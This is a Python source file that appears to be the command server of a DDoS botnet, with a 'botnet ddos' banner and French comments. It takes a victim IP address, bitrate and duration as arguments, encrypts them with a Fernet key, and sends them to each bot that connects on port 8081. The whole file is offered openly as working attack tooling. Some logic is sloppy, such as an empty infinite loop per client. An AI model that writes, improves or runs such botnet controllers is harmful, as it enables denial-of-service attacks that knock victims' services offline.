import socket
import os
from _thread import *
import argparse
from cryptography.fernet import Fernet
from requests import get
from netifaces import interfaces, ifaddresses, AF_INET

print("""
$$\                  $$\                          $$\                 $$\       $$\                     
$$ |                 $$ |                         $$ |                $$ |      $$ |                    
$$$$$$$\   $$$$$$\ $$$$$$\   $$$$$$$\   $$$$$$\ $$$$$$\          $$$$$$$ | $$$$$$$ | $$$$$$\   $$$$$$$\ 
$$  __$$\ $$  __$$\\_$$  _|  $$  __$$\ $$  __$$\\_$$  _|        $$  __$$ |$$  __$$ |$$  __$$\ $$  _____|
$$ |  $$ |$$ /  $$ | $$ |    $$ |  $$ |$$$$$$$$ | $$ |          $$ /  $$ |$$ /  $$ |$$ /  $$ |\$$$$$$\  
$$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$   ____| $$ |$$\       $$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\ 
$$$$$$$  |\$$$$$$  | \$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$  |      \$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$$$$$$  |
\_______/  \______/   \____/ \__|  \__| \_______|  \____/        \_______| \_______| \______/ \_______/
""")

#Récupère les arguments de l'utilisateur

parser = argparse.ArgumentParser(prog="botnet DDoS", description="A botnet DDoS in python")

parser.add_argument("ip_address", type=str, help="The IP address of the victim")
parser.add_argument("-b", "--bitrate", type=int, help="The bitrate for the attack in MB/s", action="store")
parser.add_argument("-t", "--time", type=int, help="The length of the attack in second", action="store")

args = parser.parse_args() # Access args with args.ip_address, args.bitrate, args.time


#Récupération de la clé symétrique
with open("secret.key", "rb") as key_file:
    key=key_file.read()
fernet = Fernet(key)

#création d'une socket
server_socket=socket.socket()



for ifaceName in interfaces():
    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
    for addresse in addresses:
        if addresse[1]!=2:
            ip=addresse
    print(' '.join(addresses))

host=str(ip)
port=8081

ThreadCount=0

server_socket.bind((host, port))

server_socket.listen()

def multi_threaded_client(connection):
    data=args.ip_address+" " +str(args.bitrate)+" "+str(args.time)
    data=bytes(data, 'utf-8')
    encrypted_data=fernet.encrypt(data)

    connection.send(encrypted_data)
    
    while True:
        """
        data=connection.recv(2048)
        response='Server message: ' + data.decode('utf-8')
        if not data:
            break
        connection.sendall(str.encode(response))"""
    connection.close()

while True:
    Client, address = server_socket.accept()
    print('[+] Connected to: ' + address[0] + ':' + str(address[1]))
    start_new_thread(multi_threaded_client, (Client, ))
    ThreadCount += 1
    print('[+] Thread Number: ' + str(ThreadCount))
server_socket.close()